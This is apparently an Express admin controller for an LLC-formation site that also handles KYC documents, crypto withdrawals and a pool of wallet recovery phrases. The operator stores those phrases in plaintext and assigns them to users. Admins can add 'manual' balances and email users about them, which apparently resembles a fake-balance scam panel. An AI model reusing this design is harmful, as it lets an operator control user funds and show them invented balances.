const Plan = require('../models/Plan');
const User = require('../models/User');
const LLCApplication = require('../models/LLCApplication');
const WalletPool = require('../models/WalletPool');
const { sendEmail, emailTemplates } = require('../utils/emailService');
const fs = require('fs');
const path = require('path');
const WithdrawalRequest = require('../models/WithdrawalRequest');

// ============================================
// DASHBOARD CONTROLLERS
// ============================================

const getDashboard = async (req, res) => {
  try {
    const totalUsers = await User.countDocuments({ role: 'user' });
    const totalApplications = await LLCApplication.countDocuments();
    const pendingApplications = await LLCApplication.countDocuments({ status: 'pending' });
    const approvedApplications = await LLCApplication.countDocuments({ status: 'approved' });
    const availableWallets = await WalletPool.countDocuments({ status: 'available' });
    const assignedWallets = await WalletPool.countDocuments({ status: 'assigned' });
    
    const recentApplications = await LLCApplication.find()
      .populate('userId', 'email fullName')
      .populate('planId', 'name')
      .sort({ createdAt: -1 })
      .limit(5);

    res.render('admin/dashboard', {
      title: 'Admin Dashboard',
      stats: {
        totalUsers,
        totalApplications,
        pendingApplications,
        approvedApplications,
        availableWallets,
        assignedWallets
      },
      recentApplications
    });
  } catch (error) {
    console.error('Dashboard error:', error);
    res.status(500).render('500', { title: 'Server Error' });
  }
};

// ============================================
// WALLET POOL CONTROLLERS
// ============================================
const adjustWalletBalance = async (req, res) => {
  try {
    const { amount, operation, reason } = req.body;
    const walletId = req.params.id;
    
    const wallet = await WalletPool.findById(walletId);
    if (!wallet) return res.redirect('/admin/wallet-pool?error=Wallet not found');

    const adjAmount = parseFloat(amount);
    if (isNaN(adjAmount) || adjAmount <= 0) {
      return res.redirect('/admin/wallet-pool?error=Invalid amount');
    }

    if (operation === 'add') {
      if (!reason || reason.trim() === '') {
        return res.redirect('/admin/wallet-pool?error=Reason required for additions');
      }
      wallet.manualBalance = (wallet.manualBalance || 0) + adjAmount;
    } else if (operation === 'subtract') {
      wallet.manualBalance = (wallet.manualBalance || 0) - adjAmount;
    } else {
      return res.redirect('/admin/wallet-pool?error=Invalid operation');
    }

    // Log the adjustment
    wallet.balanceAdjustments.push({
      amount: adjAmount,
      operation,
      reason: reason || '',
      date: new Date(),
      performedBy: req.session.user.id
    });

    await wallet.save();

    // Send email only on add
    if (operation === 'add') {
      const assignedUser = await User.findById(wallet.assignedTo);
      if (assignedUser) {
        const emailData = emailTemplates.balanceAdded(
          assignedUser.fullName,
          adjAmount,
          reason,
          wallet.manualBalance
        );
        await sendEmail({
          to: assignedUser.email,
          subject: emailData.subject,
          html: emailData.html
        });
      }
    }

    res.redirect('/admin/wallet-pool?success=Balance adjusted');
  } catch (error) {
    console.error('Adjust balance error:', error);
    res.redirect('/admin/wallet-pool?error=Adjustment failed');
  }
};

// ============================================
// PLAN CONTROLLERS (CRUD)
// ============================================

const getPlans = async (req, res) => {
  try {
    const plans = await Plan.find().sort({ price: 1 });
    res.render('admin/plans', {
      title: 'Manage Plans',
      plans,
      success: req.query.success || null,
      error: null
    });
  } catch (error) {
    console.error('Get plans error:', error);
    res.render('admin/plans', {
      title: 'Manage Plans',
      plans: [],
      error: 'Failed to load plans',
      success: null
    });
  }
};

const getCreatePlan = (req, res) => {
  res.render('admin/plan-form', {
    title: 'Create New Plan',
    plan: null,
    formAction: '/admin/plans/create',
    submitText: 'Create Plan',
    error: null
  });
};

const createPlan = async (req, res) => {
  try {
    const { name, price, processingTime, description, features, recommended, isActive } = req.body;
    
    const featuresArray = features.split('\n').filter(f => f.trim() !== '');
    
    const plan = await Plan.create({
      name,
      price: parseFloat(price),
      processingTime,
      description,
      features: featuresArray,
      recommended: recommended === 'on',
      isActive: isActive === 'on'
    });

    res.redirect('/admin/plans?success=Plan created successfully');
  } catch (error) {
    console.error('Create plan error:', error);
    res.render('admin/plan-form', {
      title: 'Create New Plan',
      plan: null,
      formAction: '/admin/plans/create',
      submitText: 'Create Plan',
      error: error.message
    });
  }
};

const getEditPlan = async (req, res) => {
  try {
    const plan = await Plan.findById(req.params.id);
    if (!plan) {
      return res.redirect('/admin/plans?error=Plan not found');
    }
    
    res.render('admin/plan-form', {
      title: 'Edit Plan',
      plan,
      formAction: `/admin/plans/edit/${plan._id}`,
      submitText: 'Update Plan',
      error: null
    });
  } catch (error) {
    console.error('Get edit plan error:', error);
    res.redirect('/admin/plans?error=Failed to load plan');
  }
};

const updatePlan = async (req, res) => {
  try {
    const { name, price, processingTime, description, features, recommended, isActive } = req.body;
    
    const featuresArray = features.split('\n').filter(f => f.trim() !== '');
    
    await Plan.findByIdAndUpdate(req.params.id, {
      name,
      price: parseFloat(price),
      processingTime,
      description,
      features: featuresArray,
      recommended: recommended === 'on',
      isActive: isActive === 'on',
      updatedAt: Date.now()
    });

    res.redirect('/admin/plans?success=Plan updated successfully');
  } catch (error) {
    console.error('Update plan error:', error);
    res.redirect(`/admin/plans/edit/${req.params.id}?error=${encodeURIComponent(error.message)}`);
  }
};

const deletePlan = async (req, res) => {
  try {
    await Plan.findByIdAndDelete(req.params.id);
    res.redirect('/admin/plans?success=Plan deleted successfully');
  } catch (error) {
    console.error('Delete plan error:', error);
    res.redirect('/admin/plans?error=Failed to delete plan');
  }
};

const togglePlanStatus = async (req, res) => {
  try {
    const plan = await Plan.findById(req.params.id);
    if (!plan) return res.redirect('/admin/plans?error=Plan not found');
    plan.isActive = !plan.isActive;
    await plan.save();
    res.redirect('/admin/plans?success=Plan status updated');
  } catch (error) {
    console.error('Toggle plan error:', error);
    res.redirect('/admin/plans?error=Failed to update plan status');
  }
};

// ============================================
// LLC APPLICATION CONTROLLERS
// ============================================

const getApplications = async (req, res) => {
  try {
    const filter = req.query.status || 'all';
    let query = {};
    if (filter !== 'all') {
      query.status = filter;
    }
    
    const applications = await LLCApplication.find(query)
      .populate('userId', 'email fullName')
      .populate('planId', 'name price')
      .sort({ createdAt: -1 });

    res.render('admin/applications', {
      title: 'LLC Applications',
      applications,
      filter,
      success: req.query.success || null,
      error: req.query.error || null
    });
  } catch (error) {
    console.error('Get applications error:', error);
    res.render('admin/applications', {
      title: 'LLC Applications',
      applications: [],
      filter: 'all',
      error: 'Failed to load applications'
    });
  }
};

const getApplicationDetail = async (req, res) => {
  try {
    const application = await LLCApplication.findById(req.params.id)
      .populate('userId', 'email fullName phone address')
      .populate('planId', 'name price processingTime');

    if (!application) {
      return res.redirect('/admin/applications?error=Application not found');
    }

    res.render('admin/application-detail', {
      title: 'Application Details',
      application
    });
  } catch (error) {
    console.error('Get application detail error:', error);
    res.redirect('/admin/applications?error=Failed to load application');
  }
};

const approveApplication = async (req, res) => {
  try {
    const application = await LLCApplication.findById(req.params.id)
      .populate('userId', 'email fullName')
      .populate('planId', 'name');

    if (!application) {
      return res.redirect('/admin/applications?error=Application not found');
    }

    application.status = 'approved';
    application.approvedAt = new Date();
    await application.save();

    // Send approval email
    const emailData = emailTemplates.llcApproved(
      application.userId.fullName,
      application.desiredLLCName
    );
    
    await sendEmail({
      to: application.userId.email,
      subject: emailData.subject,
      html: emailData.html
    });

    res.redirect('/admin/applications?success=Application approved');
  } catch (error) {
    console.error('Approve application error:', error);
    res.redirect('/admin/applications?error=Failed to approve application');
  }
};

const rejectApplication = async (req, res) => {
  try {
    const { rejectionReason } = req.body;
    
    const application = await LLCApplication.findById(req.params.id)
      .populate('userId', 'email fullName')
      .populate('planId', 'name');

    if (!application) {
      return res.redirect('/admin/applications?error=Application not found');
    }

    application.status = 'rejected';
    application.rejectionReason = rejectionReason;
    application.rejectedAt = new Date();
    await application.save();

    // Send rejection email
    const emailData = emailTemplates.llcRejected(
      application.userId.fullName,
      application.desiredLLCName,
      rejectionReason
    );
    
    await sendEmail({
      to: application.userId.email,
      subject: emailData.subject,
      html: emailData.html
    });

    res.redirect('/admin/applications?success=Application rejected');
  } catch (error) {
    console.error('Reject application error:', error);
    res.redirect('/admin/applications?error=Failed to reject application');
  }
};


const deleteApplication = async (req, res) => {
  try {
    await LLCApplication.findByIdAndDelete(req.params.id);
    res.redirect('/admin/applications?success=Application deleted');
  } catch (error) {
    console.error('Delete application error:', error);
    res.redirect('/admin/applications?error=Failed to delete application');
  }
};


// ============================================
// KYC MANAGEMENT CONTROLLERS
// ============================================
// List KYC requests
const getKycList = async (req, res) => {
  try {
    const filter = req.query.status || 'pending';
    const query = filter === 'all' ? { kycStatus: { $ne: 'not_started' } } : { kycStatus: filter };
    const users = await User.find(query).sort({ kycSubmittedAt: -1 });
    res.render('admin/kyc-list', { 
      title: 'KYC Verification',
      users, 
      filter,
      user: req.session.user,   // <-- ADD THIS
      success: req.query.success || null 
    });
  } catch (error) {
    console.error('KYC list error:', error);
    res.redirect('/admin/dashboard?error=Failed to load KYC');
  }
};

// Detail view
const getKycDetail = async (req, res) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return res.redirect('/admin/kyc?error=User not found');
    res.render('admin/kyc-detail', { title: 'KYC Detail', user });
  } catch (error) {
    res.redirect('/admin/kyc?error=Failed to load detail');
  }
};


// Serve document file securely
const viewKycDocument = async (req, res) => {
  try {
    const user = await User.findById(req.params.id);
    const docType = req.params.type; // idFrontImage, idBackImage, selfieImage, addressDocument
    const doc = user.kycData?.[docType];
    if (!doc || !doc.filePath) return res.status(404).send('Document not found');
    const filePath = path.join(__dirname, '..', doc.filePath);
    res.sendFile(filePath);
  } catch (error) {
    res.status(500).send('Error loading document');
  }
};

// Serve application document file securely
const viewApplicationDocument = async (req, res) => {
  try {
    const application = await LLCApplication.findById(req.params.id);
    if (!application) return res.status(404).send('Application not found');
    const doc = application.documents[parseInt(req.params.index)];
    if (!doc) return res.status(404).send('Document not found');
    const filePath = path.join(__dirname, '..', doc.filePath);
    res.sendFile(filePath);
  } catch (error) {
    res.status(500).send('Error loading document');
  }
};


// Approve
const approveKyc = async (req, res) => {
  try {
    const user = await User.findById(req.params.id);
    user.kycStatus = 'approved';
    user.kycReviewedAt = new Date();
    user.kycReviewerId = req.session.user.id;
    await user.save();
    // Send email
    const emailData = emailTemplates.kycApproved(user.fullName);
    await sendEmail({ to: user.email, subject: emailData.subject, html: emailData.html });
    res.redirect('/admin/kyc?success=KYC approved');
  } catch (error) {
    res.redirect('/admin/kyc?error=Approval failed');
  }
};

// Reject
const rejectKyc = async (req, res) => {
  try {
    const { reason } = req.body;
    const user = await User.findById(req.params.id);
    user.kycStatus = 'rejected';
    user.kycRejectionReason = reason;
    user.kycReviewedAt = new Date();
    user.kycReviewerId = req.session.user.id;
    await user.save();
    const emailData = emailTemplates.kycRejected(user.fullName, reason);
    await sendEmail({ to: user.email, subject: emailData.subject, html: emailData.html });
    res.redirect('/admin/kyc?success=KYC rejected');
  } catch (error) {
    res.redirect('/admin/kyc?error=Rejection failed');
  }
};

// ============================================
// WITHDRAWAL MANAGEMENT CONTROLLERS
// ===========================================
const getWithdrawals = async (req, res) => {
  try {
    const filter = req.query.status || 'pending';
    const query = filter === 'all' ? {} : { status: filter };
    const withdrawals = await WithdrawalRequest.find(query)
      .populate('userId', 'fullName email')
      .populate('walletId', 'addresses')
      .sort({ createdAt: -1 });
    res.render('admin/withdrawals', {
      title: 'Withdrawal Requests',
      withdrawals,
      filter,
      success: req.query.success || null,
      error: req.query.error || null
    });
  } catch (error) {
    console.error('Get withdrawals error:', error);
    res.redirect('/admin/dashboard?error=Failed to load withdrawals');
  }
};

// Approve withdrawal: set status, adjust wallet balance, send email
const approveWithdrawal = async (req, res) => {
  try {
    const withdrawal = await WithdrawalRequest.findById(req.params.id).populate('userId walletId');
    if (!withdrawal) return res.redirect('/admin/withdrawals?error=Not found');
    
    withdrawal.status = 'approved';
    await withdrawal.save();

    // Optional: deduct from manualBalance (we'll do that)
    const wallet = withdrawal.walletId;
    wallet.manualBalance = (wallet.manualBalance || 0) - withdrawal.amount;
    await wallet.save();

    // Send email
    const emailData = emailTemplates.withdrawalApproved(
      withdrawal.userId.fullName,
      withdrawal.amount,
      withdrawal.chain
    );
    await sendEmail({ to: withdrawal.userId.email, subject: emailData.subject, html: emailData.html });

    res.redirect('/admin/withdrawals?success=Withdrawal approved');
  } catch (error) {
    console.error('Approve withdrawal error:', error);
    res.redirect('/admin/withdrawals?error=Approval failed');
  }
};

// Reject withdrawal: set status, add admin notes, send email
const rejectWithdrawal = async (req, res) => {
  try {
    const { reason } = req.body;
    const withdrawal = await WithdrawalRequest.findById(req.params.id).populate('userId walletId');
    if (!withdrawal) return res.redirect('/admin/withdrawals?error=Not found');

    withdrawal.status = 'rejected';
    withdrawal.adminNotes = reason;
    await withdrawal.save();

    const emailData = emailTemplates.withdrawalRejected(
      withdrawal.userId.fullName,
      withdrawal.amount,
      withdrawal.chain,
      reason
    );
    await sendEmail({ to: withdrawal.userId.email, subject: emailData.subject, html: emailData.html });

    res.redirect('/admin/withdrawals?success=Withdrawal rejected');
  } catch (error) {
    console.error('Reject withdrawal error:', error);
    res.redirect('/admin/withdrawals?error=Rejection failed');
  }
};

// ============================================
// WALLET POOL CONTROLLERS
// ============================================

const getWalletPool = async (req, res) => {
  try {
    const wallets = await WalletPool.find()
      .populate('assignedTo', 'email fullName')
      .populate('createdBy', 'email fullName')
      .sort({ createdAt: -1 });

    const stats = {
      total: wallets.length,
      available: wallets.filter(w => w.status === 'available').length,
      assigned: wallets.filter(w => w.status === 'assigned').length,
      viewed: wallets.filter(w => w.status === 'viewed').length
    };

    res.render('admin/wallet-pool', {
      title: 'Wallet Phrase Pool',
      wallets,
      stats,
      success: req.query.success || null,
      error: req.query.error || null
    });
  } catch (error) {
    console.error('Get wallet pool error:', error);
    res.render('admin/wallet-pool', {
      title: 'Wallet Phrase Pool',
      wallets: [],
      stats: { total: 0, available: 0, assigned: 0, viewed: 0 },
      error: 'Failed to load wallet pool'
    });
  }
};

const addWalletPhrase = async (req, res) => {
  try {
    const { recoveryPhrase, btc, eth, usdt, xrp, bnb, notes } = req.body;

    // check required
    if (!recoveryPhrase || !btc || !eth || !usdt || !xrp || !bnb) {
      return res.redirect('/admin/wallet-pool?error=All address fields are required');
    }

    const existing = await WalletPool.findOne({ recoveryPhrase });
    if (existing) {
      return res.redirect('/admin/wallet-pool?error=Phrase already exists in pool');
    }

    await WalletPool.create({
      recoveryPhrase,
      addresses: { btc, eth, usdt, xrp, bnb },
      notes,
      createdBy: req.session.user.id,
      status: 'available'
    });

    res.redirect('/admin/wallet-pool?success=Wallet phrase added');
  } catch (error) {
    console.error('Add wallet phrase error:', error);
    res.redirect('/admin/wallet-pool?error=Failed to add phrase');
  }
};

const bulkAddWalletPhrases = async (req, res) => {
  try {
    const { phrases } = req.body;
    const lines = phrases.split('\n').filter(line => line.trim() !== '');
    const wallets = [];

    for (const line of lines) {
      // Expected format: phrase,btc,eth,usdt,xrp,bnb
      const parts = line.split(',').map(s => s.trim());
      if (parts.length < 6) continue;
      const [phrase, btc, eth, usdt, xrp, bnb] = parts;
      if (!phrase || !btc || !eth || !usdt || !xrp || !bnb) continue;

      wallets.push({
        recoveryPhrase: phrase,
        addresses: { btc, eth, usdt, xrp, bnb },
        createdBy: req.session.user.id,
        status: 'available'
      });
    }

    if (wallets.length > 0) {
      await WalletPool.insertMany(wallets);
    }
    res.redirect(`/admin/wallet-pool?success=Added ${wallets.length} wallet phrases`);
  } catch (error) {
    console.error('Bulk add error:', error);
    res.redirect('/admin/wallet-pool?error=Failed to bulk add phrases');
  }
};

const deleteKyc = async (req, res) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return res.redirect('/admin/kyc?error=User not found');

    // Reset KYC status and remove submitted data
    user.kycStatus = 'not_started';
    user.kycData = undefined;
    user.kycSubmittedAt = undefined;
    user.kycReviewedAt = undefined;
    user.kycRejectionReason = undefined;
    await user.save();

    res.redirect('/admin/kyc?success=KYC deleted');
  } catch (error) {
    console.error('Delete KYC error:', error);
    res.redirect('/admin/kyc?error=Delete failed');
  }
};

const deleteWalletPhrase = async (req, res) => {
  try {
    const wallet = await WalletPool.findById(req.params.id);
    
    if (!wallet) {
      return res.redirect('/admin/wallet-pool?error=Wallet not found');
    }
    
    if (wallet.status !== 'available') {
      return res.redirect('/admin/wallet-pool?error=Cannot delete assigned wallet');
    }
    
    await WalletPool.findByIdAndDelete(req.params.id);
    res.redirect('/admin/wallet-pool?success=Wallet phrase deleted');
  } catch (error) {
    console.error('Delete wallet error:', error);
    res.redirect('/admin/wallet-pool?error=Failed to delete wallet phrase');
  }
};


// ============================================
// USER MANAGEMENT CONTROLLERS
// ============================================

const getUsers = async (req, res) => {
  try {
    const users = await User.find({ role: 'user' }).sort({ createdAt: -1 });
    res.render('admin/users', {
      title: 'Manage Users',
      users
    });
  } catch (error) {
    console.error('Get users error:', error);
    res.render('admin/users', {
      title: 'Manage Users',
      users: [],
      error: 'Failed to load users'
    });
  }
};

module.exports = {
  getDashboard,
  getPlans,
  getCreatePlan,
  createPlan,
  getEditPlan,
  updatePlan,
  deletePlan,
  togglePlanStatus,
  getApplications,
  getApplicationDetail,
  approveApplication,
  rejectApplication,
  deleteApplication,
  getWalletPool,
  addWalletPhrase,
  bulkAddWalletPhrases,
  deleteWalletPhrase,
  getUsers,
  getKycList,
  getKycDetail,
  viewKycDocument,
  viewApplicationDocument,
  approveKyc,
  rejectKyc,
  deleteKyc,
  getWithdrawals,
  approveWithdrawal,
  rejectWithdrawal,
  adjustWalletBalance
};
